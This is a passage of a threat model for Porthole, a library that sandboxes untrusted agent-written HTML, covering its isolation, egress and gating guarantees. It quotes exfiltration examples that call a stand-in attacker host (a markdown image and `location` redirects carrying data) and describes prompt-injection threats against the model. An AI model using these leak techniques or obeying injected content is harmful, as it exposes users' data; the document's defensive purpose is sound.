# Threat model

What Porthole protects, from whom, and where that protection ends. For each way of using it
(S1–S7), it says what Porthole guarantees, what the host must do itself, and what is not
guaranteed. [ADOPTING.md](ADOPTING.md) says how to set each one up, and
[DESIGN.md](DESIGN.md) lists every defense with the test that proves it.

**Status.** This describes Porthole 0.14.5 (2026-10-29). A review on 2026-10-19 found gaps, and every decision it led to
has merged ([§8](#8-fixes-in-flight) lists them). P096 changed the negative-control runner and CI,
and the shipped conformance probes' messages and timing, not what they check. P104 (0.9.0's
annotation markers) had a review of its own, and P105, in 0.10.0, is what it led to. 0.11.0 was
never published (its release stopped at the CI gate), and 0.12.0 carries all of it: draft marks
(P107, §7 "Drafts": what a page learns from them and who may receive them), an advisory lint
(P106, no change to isolation), and `comments.open` with a draft (P108, §7: the host's duties
around it). The review of 0.12.0's drafts led to P109, in 0.13.0: a display can take the keyboard, which
`createHost` now gives back (§6, §7 "The keyboard"); `comments.open` needs the person in the
calling frame; a page's draft text is stricter, and the composer it fills is the person's to act
on (§7). 0.13.0 also makes P106's lint fail soft and read only what it may (P110, no change to
isolation). 0.14.0 adds a nested page (P111, `nested: true`, S3): the framed address is Porthole's
shell alone and the page its opaque child, so a realm the page can't reach tells the host when the
person, not the page, pressed in it (§7 "The keyboard", `comments`); and P112's annotation
additions for a host's comment modes (hints, as every report is, §7). 0.14.1: P114
(porthole#56) serves a nested page's shell on a label of its own, on which nothing but nested
pages' shells, their pages, those pages' files and status pages is ever served, so no other
display of the scope is same-origin with the shell (S3).

## 1. Two layers

Porthole has two layers, and most hosts need only the first.

- **The display layer** shows untrusted HTML. It puts the content on an origin that isn't the
  host's, closes its network, runs a shell in its frame, gates the few host functions the content
  may call (send a prompt, open a link, copy text, read the host's data), and writes the agent's
  manual, all from one config. Presets: `inlineWidget`, `liveWidget`, `artifact`, `mcpApp`,
  `url`.
- **The app runtime** is optional, and off unless a config sets `runtime: "1"`. It lets a page be
  a small app: through `porthole.use(name)` it reaches the host's services (`user`, `comments`,
  `artifact`, `assets`, `db`) for what it declared and what its viewer's level allows. It brings
  the host's backend into the picture: who may call what, per version, revocation, and each
  person's data.

A host that only shows content can skip the app runtime, and the parts of this document about it.
[§7](#7-the-display-layer-and-the-app-runtime) says what each layer guarantees.

## 2. What is protected

| Asset | What an attacker wants from it |
| --- | --- |
| **The host** | Its DOM, cookies, session and origin: to read the app's data or act as the person in it. |
| **The person's data** | What the content shows them, and what they type into it. |
| **The model and its tools** | The model's context, and the power to send prompts and call tools in the person's name. |
| **The person's trust** | A convincing fake (a sign-in form, an "approve" button) that gets them to act. |
| **Availability** | Out of scope in the viewer's browser ([§5](#5-out-of-scope)). |

## 3. Who attacks

| | Attacker | Their code runs as | Scenarios |
| --- | --- | --- | --- |
| (a) | An agent steered by prompt injection, writing hostile content | the content of any display it writes | S1–S4 |
| (b) | A third-party MCP server | its MCP Apps view | S5 |
| (c) | The author of a page others open: a public link's author against its visitors, or a page on a sibling label of the same content domain | a served page | S3, S4, S6 |
| (d) | The app being previewed | an app on a content origin (url mode) | S6 |
| (e) | Other content on the same page | a sibling frame | S7, and S2 |

The agent is itself a trust boundary. What it writes is untrusted, and a library it loads from an
allowed CDN is no more trusted than its own code: the manual's advice to pin exact versions helps
the agent, but it is not a wall.

## 4. Two lines of defense

1. **Against attacks on the host: origin isolation.** Content runs on an origin that is never the
   host's: an opaque one (a `srcdoc` frame with `sandbox="allow-scripts"` and nothing else), or
   one of its own on a separate registrable domain (served pages). Same-origin policy then denies
   it the host's DOM, storage, cookies and credentials, and nothing secret of the host's is sent
   into the frame.
2. **Against leaking and deceiving: closed egress, gates, and approvals outside the frame.**
   Isolation doesn't stop content from sending out what it was given, or from drawing a fake. So:
   - its network is closed by default: the frame's CSP, the shell's defenses for channels a CSP
     doesn't cover (WebRTC, nested frames, resource hints), and the embedding page's `frame-src`
     against the frame navigating itself away;
   - everything beyond drawing is a host function the config declares, behind gates: a user
     gesture, a person's confirmation, consent, a rate;
   - the host draws its confirmations and consent outside the frame, where content can't draw over
     them;
   - the host's fallback for a frame that showed nothing ("open this in a new tab to sign in",
     "you no longer have access", with a link) is drawn from Porthole's pages' word only, never
     from what the content says (P124, P125; a url-mode app aside, S6). For a served display that
     isn't nested — where a same-scope sibling could otherwise speak for it ([§7](#the-display-layer)) —
     that word comes from a **door**: a page of Porthole's on the display's origin, in a hidden
     opaque frame of the host's that no content can reach, taken before the content is framed. The
     content frame's own word is then never taken, and its silence is a timeout, never a fallback.

The app runtime adds a third: **the host's API is the wall for its data.** The bridge refuses a
call the page didn't declare (`undeclared`), or that the viewer's level doesn't allow, before any
handler runs. The names a page declares in `data` hold with a viewer and without one (P094). The
host's API checks again, since a call that reaches the API some other way can claim any
viewer and any declaration.

The leak suite attempts each channel in DESIGN.md's table from inside the content, on Chromium,
WebKit and Firefox, and most defenses have a negative control that takes the defense out to show
its probes then fail (DESIGN.md § "Egress hardening, each with its test"). CI runs every negative
control on all three engines, and a control passes only when its marked probes failed by their own
assertion (P096).

## 5. Out of scope

Porthole does not protect against these.

- **Availability in the viewer's browser.** Content can loop, allocate without bound, or fill the
  content domain's cookies. Porthole has no watchdog: nothing but the load timeout watches a
  frame, nothing unloads a frame that stops answering, and nothing limits its CPU or memory. An
  opaque frame may share the host page's process (the browser decides), so a loop in it can stall
  the host's tab; a served frame is on another site, which browsers with site isolation put in a
  process of its own. In scope, by contrast: a page or a request that can crash the host's server,
  and a message from content that makes the host's page do unbounded work (SECURITY.md). Through
  Porthole's Node adapter no request ends the process, and on any runtime the issue endpoint reads
  at most 64 KiB of a body (P092). What content sends is read after its gate, into bounded text,
  and nothing it sends throws out of an adapter (P095).
- **Browser bugs, and what the leak suite doesn't run on.** The walls are the browser's own (the
  sandbox, CSP, same-origin policy, site isolation): a bug in them is outside Porthole. The suite
  runs Chromium, WebKit and Firefox through Playwright; other engines, versions and embedded
  WebViews are untested. Side channels (timing, Spectre-class) are out too: an opaque frame that
  may share the host's process can learn about it that way; domain mode puts content on another
  site, which browsers with site isolation give its own process.
- **Markdown-image exfiltration in chat renderers** (the EchoLeak and CamoLeak class: a model's
  reply holds `![](https://attacker.example/?q=<secret>)` and the chat loads it). That is the
  chat's own rendering of model text. Porthole's walls apply to HTML handed to a display.
- **Deceptive content.** Content may draw anything in its frame, a fake sign-in form included.
  Porthole limits where what is typed into it can go and keeps the host's approvals outside the
  frame; it doesn't judge what content shows.
- **A display taking the keyboard** (accepted risk, P123). Content can move focus into its frame
  (`focus()` and the like) while the person types in the host's page, and receive the keys typed
  after it. Porthole's guard takes the keyboard back and stops a display that keeps taking it, but
  only as best effort (§7 "The keyboard"): on a nested page it doesn't cover typing slower than one
  key per 250 ms, which is most people, phones included. Browsers give a host no way to prevent it,
  and the person sees their text stop appearing. The walls that hold regardless: content can't read
  the host's page, its storage or another display, and a nested page's sealed address stays in a
  shell no content shares.
- **Wrong results.** A chart can plot the wrong numbers, and a report can say false things.
- **Malicious prompts.** A gated `sendPrompt` hands the host's confirm function the whole text (the
  default dialog shows all of it); whether that text is hostile is not Porthole's call. Nor is text
  content puts in the model's context (S5).
- **The sense of a confirmed action.** A confirmation is given the call and its arguments. Whether
  doing it is wise is the person's decision, and what the host's handler then does is the host's.

## 6. Scenarios

| | Use | Preset and mode | Attackers | Use it today when |
| --- | --- | --- | --- | --- |
| [S1](#s1-inline-widgets-in-a-conversation) | Inline widgets in a conversation | `inlineWidget`, opaque | (a) | every page sends `embedderCsp` |
| [S2](#s2-live-widgets-content-that-reads-the-hosts-data) | Live widgets that read the host's data | `liveWidget` | (a), (e) | as S1, and the page follows S7 |
| [S3](#s3-private-artifacts) | Private artifacts | `artifact`, domain | (a), (c) | the content domain is the host's alone, the secret is random, `authorize` revokes |
| [S4](#s4-public-links-and-pages-that-are-apps) | Public links, and pages that are apps | `artifact`, domain, public grants; `runtime` | (a), (c) | the host handles abuse |
| [S5](#s5-third-party-mcp-apps) | Third-party MCP Apps | `mcpApp` | (b) | the host shows a view's domains |
| [S6](#s6-previews-of-a-running-app) | Previews of a running app | `url` | (d), (c) | the code is the host's own |
| [S7](#s7-several-displays-on-one-page) | Several displays on one page | any | (e) | the page follows the composition rule |

### What every host must do

Whatever the use:

- Send `displays.embedderCsp(…)` (the page's `frame-src`) on every page that shows displays, and
  run `defineHostConformance` against the real page in CI (S1 says why).
- Keep the default gates. A capability's `gates` in a config replace its defaults whole, even
  `[]`; a preset's `options.capabilities` entry replaces the preset's whole entry, gates included
  (`liveWidget({ capabilities: { readData: {} } })` drops its consent).
- Give the confirmations and the consent it draws itself the default dialog's protections: drawn
  on the host's page outside every frame, showing the call's whole effect, Cancel focused, and the
  accept button ignoring presses for 500 ms after it opens, so a click meant for the content can't
  land on it. The React binding's dialog does all of this for confirmations; consent is always the
  host's own UI. A copy notice of its own shows what went on the clipboard (S1).
- Show the text content reports (its errors, a blocked navigation's address, an annotation's
  quoted text) only as text, never as HTML.
- Draw a frame's fallback (what `frameFallback` words, or your own) from its `outcome` alone, never
  from a message of your own reading off the frame's window: a `blocked` outcome is the word of a
  page of Porthole's server, a gateway or your own pages, never of an opaque frame or of content in
  a frame that speaks (P124, P125). For a served display that isn't nested, that word is its
  **door**'s (a page of Porthole's on the display's origin, framed hidden and opaque before the
  content, which a same-scope sibling can't reach, P125); its content frame's own word is never
  taken, and its silence is a `timeout`. A `blocked` before any frame (`sign-in`, `denied`,
  `not-found`) is your own issue endpoint's refusal, mapped by `createHost` (P125): its word is
  your backend's, so what it says is as trustworthy as that endpoint. Hear the `frame-status` host
  error as a display trying to speak as Porthole, and the `door` host error as a served display
  refused for having no door (an out-of-date server, a locator that drops it, or a clean address
  framed as it is: upgrade the server/Worker first, resolve clean addresses through issue, P125):
  log them, show nothing for them. A url-mode app can still say any outcome (S6).
- Take what the frame reports about annotations as UI hints (where to draw, what to open), never
  as permissions, and put nothing in a mark the page may not know (§7).
- Guard a view that a frame's report opens or moves (`activated`, `anchored`, `selected`,
  `tracked`: a comment's bubble, a composer, a card that follows its mark, which the page moves
  at will, up to 60 times a second). The content chooses when it appears and where, so it can bring it
  under a press the person meant for the content (a double click on the content's own button whose
  second click lands on the bubble's). Such a view takes no press of any kind for 500 ms after it
  appears or moves (not a `click` only: menu triggers act on `pointerdown`, and menu items click
  themselves on a release), ignores a press that began before that, opens beside the frame rather
  than over the report's box where the layout allows, takes no focus when it opens, and puts
  nothing one click away that posts, submits, resolves, deletes or discards (a draft's view, P107,
  included: no "Post" or "Submit review" in it). Its menus and popovers are part of it, portaled
  ones too (P105; ADOPTING.md § Annotations has the code: the view `inert` while it arms).
  One exception to "takes no focus" (P112): in a comment mode the person started themselves (the
  host's own control, never a report), a composer their selection opens (`selected`) may take
  focus, with `focusField`, if all it can do is save a draft: nothing in it posts, submits or sends,
  Enter in it only adds the draft to the batch (submitting is only ever the host's own "Submit N"
  control, outside the composer), it shows plainly that it is a draft (so the person can see where
  their keys are going), and the rest of this guard holds (no press for 500 ms, beside the frame). The page still chooses
  when `selected` comes, so what it can do with that moment is put the person's next keys into a
  draft they see and can discard, never send one; outside such a mode, or for a composer that can
  send, it takes no focus.
- Know that a display can take the keyboard: a page calls `focus()` on its own input whenever it
  likes (on Chromium and WebKit with no gesture), and what the person goes on typing goes to it.
  `createHost` (every `PortholeView` too) gives focus back when it leaves one of the page's text
  fields for a frame without the person's press on the frame or a Tab, tells the display
  (`focusTaken`), and stops a display that keeps doing it (§7 "The keyboard", P109). Move focus
  into a display yourself with `display.focus()`, never the frame's own `focus()`; move it into
  your composer with `focusField(field)`, not the field's own `focus()` (Firefox ignores that while
  a fighting frame holds focus); and with a platform of your own, implement its focus guard
  (`focused`, `onFocusTaken`, `focus`) or accept that a display can read what is typed beside it.
- List every app origin in `appOrigins` (`hostOrigins` in `/server`): only those may frame content,
  and only those are checked against the content domain for a shared site.
- Under the app runtime, run `defineRuntimeConformance` with `api` in CI (§7).

### S1. Inline widgets in a conversation

`presets.inlineWidget`: a card the agent wrote, drawn in an opaque `srcdoc` frame as it streams.

**Porthole guarantees**

- An opaque origin: `sandbox="allow-scripts"` only, so no forms, popups, downloads, top or parent
  navigation, and nothing of the host's DOM, storage or cookies.
- A closed network. The frame's CSP has `default-src 'none'`, `connect-src 'none'` (until a
  capability or the egress config names an origin), `form-action 'none'`, `frame-src 'none'`,
  `base-uri 'none'`, `object-src 'none'` and `webrtc 'block'`, and no `'self'` anywhere. Before
  content runs, the shell removes the `RTC*` constructors, drops nested frames, plugins and
  resource hints as they are inserted, and makes `document.open` and `write` throw.
- While it streams, drafts are drawn inert (no scripts, handlers or navigation); the whole runs
  once.
- Only the host functions the config declares exist, each behind its default gates:

  | Host function | Default gates |
  | --- | --- |
  | `sendPrompt` | a user gesture, then the host's confirmation, given the whole text |
  | `openLink` | a gesture and a confirmation; http(s) only, no credentials in the URL |
  | `downloadFile` | a gesture and a confirmation |
  | `copyText` | a gesture, 30 a minute; the host writes the clipboard |
  | `callTool` | a confirmation, 30 a minute |
  | `setModelContext` | 30 a minute, then the host's `show`: the person sees the whole update first |
  | `readData`, `subscribeData` | 120 and 60 a minute (`liveWidget` adds consent) |
  | `reportError` | 10 a minute |

- A confirmation needs the host's confirm function: without one, the call is refused (consent and
  `show` likewise). Three declined confirmations in a row mute the display's confirm-gated calls,
  and at most 10 confirmations wait per display: more are refused (P095).
- Model context (`setModelContext`) goes only once the host's `show` has shown it, after every
  other gate. An update is text blocks and plain JSON, at most 20,000 characters, with no
  invisible characters, and the manual tells the agent it is the content's unconfirmed text,
  never instructions (P100).
- The shell takes messages only from its parent window, and the host only from its frame's
  window and origin; both validate every message.
- A frame that navigates is started again, at most three times; the next navigation stops the
  display. A display of a file set may hold such a frame for up to 2 s first, in case it was a page
  of its own set, delivering nothing either way while it waits (P098).

**The host must**

- Send the page's `frame-src` (`displays.embedderCsp(…)`; `frame-src 'none'` where all displays
  are opaque). An opaque frame can navigate itself away with data in the URL
  (`location = "https://attacker.example/?" + data`): its own CSP can't stop that, and the shell
  gets no navigation events in an opaque origin. The embedding page's `frame-src` is the only
  wall.
- Run `defineHostConformance` against its real page in CI. It runs the leak probes there, the
  self-navigation ones included, and it is the only check that the page sends that CSP: nothing
  checks it when a display mounts.
- Keep `anyHttps` off inline widgets: an image URL is a way out (P059).
- Show what a copy put on the clipboard. The React binding's toast shows at most its first four
  lines and 280 characters; a host's own `copyText` handler replaces the toast, and must show it
  itself.

**Not guaranteed**

- On a page without that `frame-src`, a widget can send out whatever it was shown.
- `copyText` needs only a gesture, not a confirmation: a widget can put text the person didn't
  choose on their clipboard when they click in it (pastejacking). The notice above is what tells
  them.
- Shown isn't read: the person may not look at a model-context update, or not see an injection
  in it for what it is, and characters that draw as a blank (a no-break space, the wide spaces)
  pass, a few bits each, bounded by the length limit (P100, accepted). A host that opts out of
  `show` (`withoutShow: true`) lets content write into the model's turns text nobody saw (S5).
- The host's gesture check reads its own page's `navigator.userActivation` (in an engine without
  it, the check passes). A gesture shows a moment of intent, not consent: the person may have
  clicked the host a moment before.
- Availability ([§5](#5-out-of-scope)).

### S2. Live widgets: content that reads the host's data

`presets.liveWidget`: an inline widget that shows the host's data, current, as the viewer may see
it.

**Porthole guarantees**, with the preset's defaults (see the host's duties below for what undoes
them):

- No network of its own: the preset refuses an `egress` option and a capability's own `connect`
  or `resource` origins, and the config it returns is frozen (P103). Served, the only scripts it
  may load are Porthole's Chart.js and D3, from its own origin (`/__porthole/lib/`).
- Data reaches it only through the host: `readData` and `subscribeData`, each behind `consent`
  (asked once per display; without a consent function every data call is refused) and a rate (120
  reads and 60 subscriptions a minute).
- A refusal tells the widget why (`data: { code, message }`).
- A result the host pushes with `changed(result)` answers a later read only past `readData`'s own
  gates, as any read does (P094).
- Served, the shell cancels any navigation of the frame to another document, other than a page of
  its own file set, and tells the host (`navigationBlocked`, where `reportError` is declared).

**The host must**

- Decide in its handlers what a URI may name, with the viewer's rights: the URI is the content's
  word.
- Ask for consent in its own UI, and keep the answer per viewer and widget.
- Send the page's `frame-src`, and show opaque live widgets only on pages that frame no content
  origins (an opaque frame's only wall against navigating away is that `frame-src`).
- Not build a config of its own from the preset's (`{ ...presets.liveWidget(), egress }`, a
  capability with origins): that config isn't the preset, and opens what it names.
- Not pass `readData` or `subscribeData` in `options.capabilities` without their gates: an entry
  there replaces the preset's, consent included.
- Follow the composition rule (S7): no url-mode or `anyHttps` displays on the same page.

**Not guaranteed**

- What a neighbouring frame does with data handed to it (S7).
- In an engine without the Navigation API, a served frame's navigation falls back to the page's
  `frame-src`: outside sites stay shut, other content origins don't (P079).
- `LIBRARY_CDNS` displays are allowed on the same page (ADOPTING.md), but they reach nine
  origins: fetches, scripts, styles, fonts and images to four package CDNs (cdnjs, jsDelivr,
  unpkg, esm.sh), and scripts, styles or fonts from five more (Google Fonts' two, Tailwind's,
  jQuery's and Plotly's). The path of every such request is a narrow channel out, read by that
  CDN's operator (P048). Keep highly sensitive data off pages with them.

### S3. Private artifacts

`presets.artifact` with `isolation: "domain"`, served by the host kit to a signed-in viewer.

Terms used below: a page's **clean address** is its address on its own content origin, with no
ticket in it, the one a person opens in a tab or shares (a path on `<label>.<content domain>`). A
framed page's **sealed files address** is `/__porthole/f/<sealed>/`: the frame's session,
encrypted into the path, since WebKit keeps no cookie in a frame (P083).

**Porthole guarantees**

- An origin per storage scope on the content domain, by default a label made from an HMAC of the
  scope under a key derived from the host's secret (120 bits). A label is an address, not a
  secret: a host may name labels itself (`prefixedName`), and access is the ticket's and the
  cookie's job.
- `createContentHost` refuses a content domain that holds an app origin or may share a site with
  one (`ContentDomainError`), and a served mount refuses a content origin same-site with the app.
  With `health` configured, frames fall back to opaque while the content domain doesn't answer.
- Access: the host decides, Porthole carries the decision. A ticket of 160 random bits, stored only
  as a hash, used once, good for 60 seconds by default and 600 at most, becomes a signed cookie of
  that origin and instance: `HttpOnly`; `__Host-` under https; `Secure` under https and always in
  a frame; in a frame `SameSite=None; Partitioned`, in a tab `Lax`.
- Only cookies Porthole set are read as its own: under https only `__Host-porthole-` names, which
  no other label can set; the entered mark names its label. A session names its scope, signed, so
  another label's session is never read as this one's, under https or on loopback (P101).
- Pages, files and status pages carry their CSP in headers and `X-Robots-Tag: noindex`, and
  `frame-ancestors` names the app's origins only.
- Files: from the version's manifest only, typed by Porthole's table, `nosniff`; files other than
  pages are `Cross-Origin-Resource-Policy: same-origin`; a file set never registers a service
  worker; a page's CSP opens its own version's path, not its whole origin.
- With a per-request check (`authorize`), the host decides again on every request; a deny is a
  403 that says `denied`.
- A nested page (`nested: true`, P111): the framed address answers Porthole's shell alone, its
  script the only one its CSP runs, framing and fetching only the origin's sealed files' prefix.
  **The shell's origin hosts nothing but the shell, its opaque page, the sealed files and status
  pages** (P114, porthole#56): the shell, the page and its files are served on a label of the
  scope's own, `porthole-<24 base32>` (`nestedLabelOf`), never on the scope's label, where its
  other displays (inline and live widgets, MCP apps, artifacts that aren't nested) run agent-made
  content with `allow-same-origin`. `/server` holds it: that label answers no clean address,
  entry, asset, library, app or other display, and takes no other instance's ticket, cookie or
  sealed address; the scope's label answers no nested page (its clean address goes on to the
  shell's label with a one-time ticket); no host's naming makes a `porthole-` label. So no
  content, of any scope, can read the shell's realm (its word to the host, the page's sealed
  address) or drive it (`leak/served/nested-siblings.spec.ts`, negative control `shell-label`).
  Porthole holds the shell to that label outside `/server` too (P121), for a content Worker of a
  host's own: the host's mount refuses a nested page located on any other label before a frame
  is made (a host error, `locate`; negative control `nested-host-label`), the shell frames
  nothing and says nothing on any other origin, and `nestedShellResponse` and `frameShellScript`
  refuse one. What else such a Worker serves on that label is its own (below).
  The page is the shell's child, `sandbox="allow-scripts"` (never `allow-same-origin`, held by a
  static check over every sandbox Porthole writes) and the same sandbox in its own CSP, so it is an
  opaque origin in its frame and on a tab; it is loaded, and loads its files, at its sealed address
  without a cookie, and its files then carry `Cross-Origin-Resource-Policy: cross-origin` and
  `Access-Control-Allow-Origin: *` (an opaque page's own loads are cross-origin: the address is
  the access, never the request's origin). So whoever holds a page's sealed address can read its
  files from any origin, a page of their own included, until the address ends (an hour on its own,
  P083): it is a bearer credential, as safe as it is unleaked. Porthole keeps it out of what it
  says: no referrer goes with any load (`Referrer-Policy: no-referrer`, the shell's frame
  `referrerpolicy="no-referrer"`), the host's reports name it as `./` (P083), and the shell's own
  answer is `no-store`. The page itself can read it (its address) and so pass it on by any channel
  it has, as it can pass on its files' bytes. The page has none of the origin's storage, and nothing
  of the shell's realm: messages between them go by `postMessage`, the page's trusted by
  `event.source`, and the shell drops what the page says in the shell's own namespace. Only the
  shell (same-origin) renews the page's address; a module the page loaded keeps one that ends
  within the hour. Every answer below the sealed prefix carries a CSP sandbox, never
  `allow-same-origin` (a page's `allow-scripts`, every other file's runs nothing): a file opened on
  a tab of its own (an SVG or XML file with a script) is opaque, never the shell's origin (negative
  control `file-sandbox`). The sandbox refuses no worker (measured on the four engines): a nested
  page's workers come from Blob URLs (a worker from its set's own script is refused by its opaque
  origin, sandbox or not), and those load the set's scripts. Assets and Porthole's libraries aren't
  served to a nested page yet.

**The host must**

- Use the content domain for nothing else, and put it on the Public Suffix List when it can
  (P047).
- Give a secret of at least 32 random bytes (`npx porthole secret`). Porthole checks only its
  length, and where `health` is configured the health route answers with a value derived from it,
  so a guessable secret can be tested offline.
- Give a per-request check (`authorize`) to revoke: sessions are signed and stateless, so without
  it a cookie is good for its whole life (an hour by default, up to 30 days). Leave its answers
  uncached (the default; `authorizeTtlSeconds` in the host kit) or call `content.forget(…)` when
  revoking, or a cached answer holds for up to that long.
- Send the page's `frame-src`.
- With nested pages, route the shell's label (`porthole-<…>.<domain>`) to the content server as
  every content label is (a wildcard needs nothing; a pattern of the host's own, `a-*`, must add
  it). A content Worker of the host's own serves nested pages on that label alone, and nothing
  else there (P114): Porthole refuses the shell anywhere else (P121), but can't see what else a
  Worker of the host's own answers on it. Its page's and files' CSPs come from `nestedFileCsp`.

**Not guaranteed**

- Until the content domain is on the PSL, its labels are same-site with each other (P047), so a
  page on one label can attack another (c). A domain-mode page has `allow-same-origin`, so it can
  set cookies for the whole content domain (in a frame, within what the browser allows a
  third-party frame). `__Host-` keeps them off its sessions' cookies, but:
  - on plain http (loopback dev only) the names have no prefix (WebKit keeps no `Secure` cookie
    on a tab there), so a page can plant a copy of a label's own session or entry nonce, for
    whoever hands it one: they are `HttpOnly` and never sent into a frame (P101);
  - in browsers that refuse no nameless cookie (older than RFC 6265bis), a page can plant a copy
    of a session it holds as `=__Host-porthole-…`; siblings can overflow the cookie jar or the
    header size (denial of service only);
  - enough large cookies make every request from that browser to the content domain too large to
    serve ([§5](#5-out-of-scope)).
- A sealed files address is a bearer credential for its version's files until the session ends
  (P083): anyone holding it can load them. It opens on its own for its first hour, then only for
  the page's own loads (`Sec-Fetch-Site: same-origin`), which a client outside a browser can claim.
- A revocation reaches the next request. It doesn't reach a page already running, an open
  WebSocket, pinned files the browser cached (immutable for a year), or assets in bearer mode
  (§7).

### S4. Public links, and pages that are apps

A served artifact anyone with its link may open (the host's `access` returns
`{ anonymous: true }`), possibly under the app runtime. It is the riskiest use: the author may be
the attacker (c), and its readers are strangers.

**Porthole guarantees**

- A public grant opens documents, never url-mode apps.
- A public grant without a `level` has no viewer. Under a runtime, such a page is refused the
  runtime's own host functions (`user`, `comments`, `artifact`, `assets`, `db`) and every method
  above `view`; with a declaration, it reads only the `data` names it declared (P094; a `data`
  without a `resources` list names them all).
- The page is on a site that isn't the host's (its sibling labels share one until the content
  domain is on the PSL, S3); a label is one DNS label, never of the form IDNA reserves (`xn--`),
  so it is never punycode for another name; pages say `noindex`; a file of a type Porthole
  doesn't know is served as a download.
- `authorize` is the host's takedown switch.
- A page opened in a tab of its own has its frame's powers and no more (P099): its CSP header
  carries the frame's sandbox (scripts on its own origin; no popups, forms, downloads, browser
  dialogs, or navigation of another window, its opener's included), and its `Permissions-Policy`
  header denies what the frame's `allow` doesn't grant (camera, microphone, location, full
  screen, passkeys, payments, sharing, the built-in AI models, and every other feature a frame
  lacks by default). The shell adds its own walls there, the only ones on engines that don't apply
  that header (WebKit, Firefox): `window.open` answers null; picture-in-picture windows, devices,
  location, full screen, passkeys, the share sheet and payments (Apple Pay too) are refused at
  once; and its navigation guard stops the page navigating itself away, by `location` (set,
  `assign`, `replace`), a link, `navigation.navigate()` or `open(…, "_self")`. The last three ask
  the guard's rule before they start (WebKit sends a link's and `navigate()`'s request otherwise),
  read the address once, and read it through the platform's own functions, so a page can't
  hand them one address to check and another to go to; a link, in a shadow root too, is followed
  by the shell as it was when clicked, never by the browser as a later listener left it.
  `defineHostConformance`'s `served.domain.tab-*` cases check it through the host's real edge.

**The host must**

- Add what Porthole doesn't have: a notice that the page is user-made (an interstitial), a way to
  report it, and a takedown process.
- Keep public grants at `view` or without a level. Porthole sets no ceiling: a public grant may
  carry any level, up to `owner`, and a `user`, and then the page has a viewer at that level.
- On pages shared with signed-in people, not offer `db` writes and `user`, or gate them with
  `consent` or `confirm` (their defaults are rates only: 600 and 60 a minute).
- Rate-limit the issue endpoint (`rateLimit`: optional, per process). An anonymous request is
  keyed by an address the client can't set (P092): the socket's peer through Porthole's Node
  adapter, `CF-Connecting-IP` on Workers. Anywhere else, or behind proxies, every anonymous request
  shares one limit unless you set `rateLimit.trustedProxies` (how many proxies append to
  `X-Forwarded-For`; only where the app is reachable through those proxies alone) or
  `rateLimit.key`.
- Check pages for secrets before publishing them: `lintContent` has no rule for credentials.
- Pass Porthole's `Content-Security-Policy` and `Permissions-Policy` headers on as they are,
  through any edge or proxy: on a tab they are the page's sandbox.
- Treat a public link's clean address as a tab's (P125): to show what one names in a frame, resolve
  it through your issue endpoint (`client.resolve`, `<PortholeView address>`). Its refusals (signed
  out, denied, not found) are your backend's word, drawn as the fallback with no frame built: keep
  that endpoint's answers as honest as its access decision, since a `blocked` there is yours, not
  Porthole's door's.

**Not guaranteed**

- In a browser without the Navigation API (older Safari and Firefox releases), a page opened in
  a tab can navigate itself away with data in the address (`location = "https://attacker.example/?"
  + whatTheVisitorTyped`): the shell's guard gets no events there, and a tab has no embedding page
  whose `frame-src` would stop it. It can also go to a `blob:` document it wrote itself, where
  the shell never runs: the CSP and its sandbox carry over, the `Permissions-Policy` header and
  the shell's walls don't (WebRTC is there, and a granted location). No CSP directive closes
  either (P099, accepted). A host that must cover such browsers shows public pages in its own
  frame.
- `db` and `user` reach the author without any network: what viewers write, and `user.get()`'s
  `{ id, name, level }`, the page can read and keep in `db`. Closed egress doesn't cover a channel
  the host itself provides. Give `id` a per-artifact pseudonym (`pseudonymFor`), and decide what
  `name` says.
- Phishing ([§5](#5-out-of-scope)).

### S5. Third-party MCP Apps

`presets.mcpApp` through `/mcp`: a view from an MCP server the host doesn't control (b).

**Porthole guarantees**

- Porthole implements the host side itself, with one hardened frame: by default an opaque frame
  with the shell's defenses first in the view's document; with `isolation: "domain"`, behind the
  sandbox proxy on a content origin.
- The view's declared CSP becomes its egress: `connectDomains` to `connect-src`, `resourceDomains`
  to scripts, styles, images, fonts and media. Only exact origins (https or wss; http and ws on
  loopback only) and `*.` wildcards over a domain are taken; a wildcard over a single label or a
  public suffix Porthole knows, and anything else, is dropped. `frameDomains` and `baseUriDomains`
  are ignored. Served, the proxy's CSP comes from what the session carries, signed, never from a
  message.
- The default gates are stricter than the spec's "MAY": `callTool` needs a confirmation and has a
  rate (30 a minute), `sendPrompt` and `openLink` a gesture and a confirmation. For a view, the
  gesture check is the host's (the shell doesn't speak for an MCP view).

**The host must**

- Send the page's `frame-src`, as for every display.
- Show the person the domains a view declares before mounting it (`readViewResource(…).egress`
  and `viewEgress()` give them; the spec says hosts SHOULD warn). Porthole has no prompt for it.
- Route `callTool` only to the view's own server, and refuse the tools the view may not call
  (`_meta.ui.visibility`): that is the host's `callTool` handler's decision alone.
- Keep `setModelContext`'s `show` gate. The React provider shows each update whole outside every
  frame (`ContextNotice`); a host's own `show` must show it whole too. Opt out
  (`withoutShow: true`) only where the handler itself puts the text in front of the person, or the
  content is the host's own (P100).
- Keep `callTool`'s confirmation. If the host's confirm says yes by itself and a view polls a tool
  more often than every 2 s, give `callTool` its own `gates` with a rate: they replace the default.

**Not guaranteed**

- Declaring is allowing: what the person sees or types in the view may go to its
  `connectDomains`.
- Code from `resourceDomains` runs in the frame (still isolated).
- Model context (`ui/update-model-context`) is shown before it goes, but showing isn't reading:
  text the person let pass can still steer the model into calling other tools, which the gates on
  the view's own calls don't catch. The manual's words (the content's unconfirmed text, never
  instructions) are the second wall (P100, accepted).
- The public suffixes Porthole refuses wildcards over are its own short list, not the whole PSL.

### S6. Previews of a running app

`presets.url`: a running app (a dev server's preview) framed by its URL (d).

**Porthole guarantees**

- Isolation: the app runs on a content origin, never the host's, in a frame with
  `sandbox="allow-scripts allow-same-origin allow-forms"`. A host may add popups (and popups that
  escape the sandbox), modals and downloads; top navigation never.
- Access: the same ticket and cookie as served pages. The upstream origin is fixed in the signed
  session; the viewer can't change it.
- Porthole's own cookies are removed before a request reaches the host's `upstream` (HTTP), and
  before the Node adapter hands a WebSocket to the host's `appSocket`.
- The app's cookie opens it only for its own origin (`Origin`, or `Sec-Fetch-Site` `same-origin`
  or `none`) and for a navigation that opens it (GET or HEAD); anything else another origin sends
  is a 403 before the upstream. A WebSocket opens from its own origin only: `content.access`, which
  the Node adapter asks before `appSocket` and a Worker asks on its own upgrade path (P101).
- `proxyTo`, Porthole's HTTP relay (pass it as `upstream`), also rewrites the headers:
  - requests go with `redirect: "manual"`;
  - `Host`, hop-by-hop headers, `X-Forwarded-*`, `Forwarded` and `X-Real-IP` are dropped;
